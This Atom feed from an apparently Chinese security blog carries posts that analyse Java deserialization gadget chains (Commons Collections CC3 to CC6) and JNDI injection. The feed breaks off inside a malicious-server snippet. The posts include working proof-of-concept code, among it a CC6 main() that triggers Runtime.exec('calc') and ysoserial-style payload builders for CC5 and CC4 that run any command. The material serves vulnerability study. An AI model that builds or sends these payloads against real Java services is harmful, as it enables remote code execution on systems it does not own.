<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XZLang</title>
  
  <subtitle>Nothing is true.Everything is permitted.</subtitle>
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2022-03-04T13:36:49.978Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>XZLang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全-CommonCollection6链</title>
    <link href="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection6%E9%93%BE/"/>
    <id>http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection6%E9%93%BE/</id>
    <published>2022-03-04T13:35:54.000Z</published>
    <updated>2022-03-04T13:36:49.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>和CC1相比，没有使用<code>AnnotationInvocationHandler</code>，但同样都是想办法调用了<code>LazyMap#get()</code>从而执行了<code>transform</code>，达到利用目的。</p><p>而<code>TiedMapEntry</code>的<code>getValue()</code>调用了<code>get()</code>。（这里的map是构造好的<code>LazyMap</code>对象）<code>hashCode()</code>中调用了<code>getValue()</code>：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111232159039.png" alt="image-20220111232159039"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111232210606.png" alt="image-20220111232210606"></p><p><code>HashSet.readObject()</code>中调用了<code>HashMap.put()</code>:</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233120936.png" alt="image-20220111233120936"></p><p>进而调用<code>HashMap.hash()</code>，这要求这里的map是<code>HashMap</code>对象</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233215114.png" alt="image-20220111233215114"></p><p>然后调用<code>hashcode()</code>：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233319579.png" alt="image-20220111233319579"></p><p>这里要求k对象是<code>TiedMapEntry</code>对象</p><p>所以在整个POC中需要三次传参，将构造好的<code>lazyMap</code>传给<code>TiedMapEntry</code>，将<code>TiedMapEntry</code>传给<code>HashMap</code>，将这个<code>HashMap</code>传给<code>HashSet</code>，然后返回这个<code>HashSet</code></p><p>根据这个流程，可以得到以下的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer Testtransformer = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">            Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line">            TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            HashSet hashSet=<span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">            hashSet.add(tiedMapEntry);</span><br><span class="line">            lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">            Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(Testtransformer, transformers);</span><br><span class="line"></span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(hashSet);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后面还调用了<code>lazyMap.remove</code>方法将<code>test1</code>给移除，这是因为在执行的时候如果没使用<code>lazyMap.remove</code>将<code>test1</code>给移除掉将不会进入到该判断语句里面去。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233913811.png" alt="image-20220111233913811"></p><h2 id="问题分析："><a href="#问题分析：" class="headerlink" title="问题分析："></a>问题分析：</h2><p>为什么会造成这里的key是test1呢，这要从<code>hashSet.add(tiedMapEntry);</code>这一行代码开始分析</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235040179.png" alt="image-20220111235040179"></p><p>调用了HashMap的put方法</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235238824.png" alt="image-20220111235238824"></p><p>然后调用了<code>hash(key)</code>这里的key是<code>tiedMapEntry</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235335732.png" alt="image-20220111235335732"></p><p><code>tiedMapEntry</code>的<code>hashCode</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235406341.png" alt="image-20220111235406341"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235507418.png" alt="image-20220111235507418"></p><p>这里的map是<code>lazyMap</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235605431.png" alt="image-20220111235605431"></p><p>然后<code>lazyMap</code>的get函数直接调用了put函数，直接把key也就是test1给put进去了，所以反序列号的时候就因为key不为空导致无法触发漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用链分析&quot;&gt;&lt;a href=&quot;#利用链分析&quot; class=&quot;headerlink&quot; title=&quot;利用链分析&quot;&gt;&lt;/a&gt;利用链分析&lt;/h2&gt;&lt;p&gt;利用链：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-CommonCollection5链</title>
    <link href="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection5%E9%93%BE/"/>
    <id>http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection5%E9%93%BE/</id>
    <published>2022-03-04T13:35:07.000Z</published>
    <updated>2022-03-04T13:35:44.335Z</updated>
    
    <content type="html"><![CDATA[<p>与CC1相比，使用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    TiedMapEntry.toString()</span><br><span class="line">        LazyMap.get()</span><br></pre></td></tr></table></figure><p>来代替</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">   Map(Proxy).entrySet()</span><br><span class="line">      AnnotationInvocationHandler.invoke()</span><br><span class="line">          LazyMap.get()</span><br></pre></td></tr></table></figure><p>从而触发transform，达到利用目的，所以只需要分析一下不同的这些部分</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107154100669.png" alt="image-20220107154100669"></p><p>可以看到，<code>BadAttributeValueExpException.readObject()</code>中调用了<code>calObj.toString()</code>，这里的<code>vaiObj</code>来自字段<code>val</code>，我们可以通过反射来设置这个值，这里必须在最后再将val设置为我们构造好的<code>TiedMapEntry</code>，否则，<code>toString</code>会在<code>BadAttributeValueExpException</code>实例化的时候直接执行导致恶意代码直接执行：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107154347061.png" alt="image-20220107154347061"></p><p>接下来，进入<code>TiedMapEntry.toString()</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107154500310.png" alt="image-20220107154500310"></p><p>从而调用<code>get()</code>方法</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107154622891.png" alt="image-20220107154622891"></p><p>yso中EXP如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">                <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;与CC1相比，使用了&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-CommonCollection4链</title>
    <link href="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection4%E9%93%BE/"/>
    <id>http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection4%E9%93%BE/</id>
    <published>2022-03-04T13:34:09.000Z</published>
    <updated>2022-03-04T13:34:45.126Z</updated>
    
    <content type="html"><![CDATA[<pre><code>CC4使用</code></pre><p>与CC2相比，使用了<code>InstantiateTransformer</code>来取代<code>InvokerTransformer</code></p><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            PriorityQueue.readObject()</span><br><span class="line">                PriorityQueue.heapify()</span><br><span class="line">                    PriorityQueue. siftDown()</span><br><span class="line">                        PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                            TransformingComparator.compare()</span><br><span class="line">                                ChainedTransformer.transform()</span><br><span class="line">                                    ConstantTransformer.transform()</span><br><span class="line">                                    InstantiateTransformer.transform()</span><br><span class="line">                                        TrAXFilter.newInstence()</span><br><span class="line">                                            TrAXFilter.TrAXFilter(Templates templates)</span><br><span class="line">                                                TemplatesImpl.newTransformer()</span><br><span class="line">                                                ......</span><br><span class="line">                                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>前半部分和后半部分前面的几条链子也都分析过了，所以也不用 再说了。</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// mock method name until armed</span></span><br><span class="line">        Class[] paramTypes = <span class="keyword">new</span> Class[] &#123; String.class &#125;;</span><br><span class="line">        Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">        InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                paramTypes, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">        args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create queue with numbers</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// swap in values to arm</span></span><br><span class="line">        Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">        paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">        args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;CC4使用&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;与CC2相比，使用了&lt;code&gt;InstantiateTransformer&lt;/code&gt;来取代&lt;code&gt;InvokerTransformer&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;利用链：&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-CommonCollection3链</title>
    <link href="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection3%E9%93%BE/"/>
    <id>http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection3%E9%93%BE/</id>
    <published>2022-03-04T13:31:37.000Z</published>
    <updated>2022-03-04T13:33:05.621Z</updated>
    
    <content type="html"><![CDATA[<p>CC3使用</p><p>利用链：</p><p>与CC1相比，CC3使用了<code>InstantiateTransformer</code>代替了<code>InvokerTransformer</code></p><p>所以整体的利用链是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InstantiateTransformer.transform()</span><br><span class="line">                                    TrAXFilter.newInstenCe()</span><br><span class="line">                                        TrAXFilter.TrAXFilter(Templates templates)</span><br><span class="line">                                            TemplatesImpl.newTransformer()</span><br><span class="line">                                            ......</span><br><span class="line">                                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>前半部分跟CC1基本一样，就不看了，直接看后面，从<code>ConstantTransformer.transform()</code>开始</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107124724749.png" alt="image-20220107124724749"></p><p>这里<code>ConstantTransformer</code>将<code>TrAXFilter</code>传递给<code>InstantiateTransformer</code></p><p>然后<code>InstantiateTransformer</code>在<code>transform()</code>里面调用了<code>newInstance()</code>，这里的con就是<code>TrAXFilter</code>的构造函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107124855248.png" alt="image-20220107124855248"></p><p>所以就调用了<code>TrAXFilter</code>的含参构造函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107125147852.png" alt="image-20220107125147852"></p><p>这里的<code>templates</code>参数就是上面传过来了<code>iArgs</code>，也就是<code>InstantiateTransformer</code>里面的<code>templatesImpl</code>，即恶意类</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220107125240289.png" alt="image-20220107125240289"></p><p>于是<code>templatesImpl</code>的<code>newTransformer()</code>被调用，恶意代码成功执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CC3使用&lt;/p&gt;
&lt;p&gt;利用链：&lt;/p&gt;
&lt;p&gt;与CC1相比，CC3使用了&lt;code&gt;InstantiateTransformer&lt;/code&gt;代替了&lt;code&gt;InvokerTransformer&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以整体的利用链是：&lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-JNDI注入</title>
    <link href="http://yoursite.com/2022/03/02/Java%E5%AE%89%E5%85%A8-JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2022/03/02/Java%E5%AE%89%E5%85%A8-JNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-02T03:17:54.000Z</published>
    <updated>2022-03-02T03:18:50.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220125151525134.png" alt="image-20220125151525134"></p><p><code>InitialContext</code>：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220125151517007.png" alt="image-20220125151517007"></p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220125151600295.png" alt="image-20220125151600295" style="zoom:67%;"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220125151734380.png" alt="image-20220125151734380" style="zoom:67%;"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220125151823314.png" alt="image-20220125151823314" style="zoom:67%;"><p>这里的var3就是获取到的Reference对象</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220123220532678.png" alt="image-20220123220532678"></p><p><code>getObjectFactoryFromReference</code>：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220128120007346.png" alt="image-20220128120007346"></p><p>JNDI的跟进lookup逻辑进行调试，如上图，找到对Reference的处理逻辑，其中动态加载并实例化Factory类，调用了<code>factory.getObjectInstance()</code>方法，获取外部远程对象实例。</p><p>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果</p><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="利用受害者本地CLASSPATH中的类"><a href="#利用受害者本地CLASSPATH中的类" class="headerlink" title="利用受害者本地CLASSPATH中的类"></a>利用受害者本地CLASSPATH中的类</h2><h3 id="JDK版本：1-8-0-191以上"><a href="#JDK版本：1-8-0-191以上" class="headerlink" title="JDK版本：1.8.0_191以上"></a>JDK版本：1.8.0_191以上</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220128115601351.png" alt="image-20220128115601351"></p><p>这里要让<code>if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase</code></p><p>这个判断结果为否，这里如果构造<code>factoryLocation==null</code>，则可以通过，但是在后面的</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220128132721989.png" alt="image-20220128132721989"></p><p>判断中无法进行<code>loadClass</code>加载我们的远程类。</p><p>所以我们的思路就变成了加载一个目标机器classpath中存在的类，然后将其实例化，调用其getObjectInstance方法时实现代码执行。</p><p>这个类首先要实现ObjectFactory接口，并且其getObjectInstance方法实现中有可以被用来构造exp的逻辑。</p><p>Veracode的博客中使用了org.apache.naming.factory.BeanFactory类，Tomcat容器本身是被广泛使用的，所以可利用性还是很强的。</p><p>恶意server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> 